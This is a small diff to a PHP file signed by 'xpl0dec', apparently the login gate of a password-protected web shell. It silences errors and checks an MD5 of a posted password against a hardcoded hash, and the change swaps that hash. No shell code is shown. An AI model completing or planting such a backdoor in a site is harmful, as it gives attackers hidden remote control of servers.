@@ -2,7 +2,7 @@
 
 //Author by xpl0dec - Bhinneka Tech
 error_reporting(0);
-$password = "944fc8eb2de26168ba0e359e484e05e0"; //BhinnekaTech
+$password = "102a6ed6587b5b8cb4ebbe972864690b"; //BhinnekaTech
 session_start();
 
 if(md5($_POST['password']) == $password) {
